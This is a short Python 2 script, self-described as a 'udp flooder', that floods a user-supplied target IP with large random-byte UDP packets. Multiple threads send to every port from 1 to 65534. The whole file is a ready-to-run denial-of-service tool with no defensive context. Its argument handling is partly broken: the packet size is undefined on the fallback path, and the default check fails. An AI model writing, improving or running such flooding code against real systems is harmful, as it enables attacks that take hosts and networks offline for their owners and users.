#!/usr/bin/python
########################
#  version .9          #
#  tom peck            #
#  2/17/13             #
#                      #
#                      #
########################
import socket
import random
import sys
import time 
import threading
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # create socket
class Attack(threading.Thread):
  def __init__(self, ip, packet, threads):
    threading.Thread.__init__(self)
    self.ip = ip
    self.packet = packet
    self.threads = threads

  def run(self):
    print 'loading thread to attack %s' % (self.ip)    
    for port in range(1, 65535):
      s.sendto(self.packet, (self.ip, port))



class main():
  def load():
    try:  
      ip = sys.argv[1]
      threads = sys.argv[2]
      if sys.argv[3] == None:
        pSize = 65500
      else:
        pSize = sys.argv[3]

    except IndexError:
      print 'you were missing something'
      ip = raw_input('target ip = ')  #input as string
      threads = input('threads (default 10) = ') #input as int
      if threads == None:
        threads = 10


    packet = random._urandom(int(pSize)) #random byte size of pSize  
    a = Attack(ip, packet, threads)
    return a

  print 'welcome to udp flooder 3000!' # first line
  a = load() # load the flooder
  for i in range(int(a.threads)):
    t = Attack(a.ip, a.packet, a.threads) # execute an attack
    t.start()
    print 'done loading'


#EOF
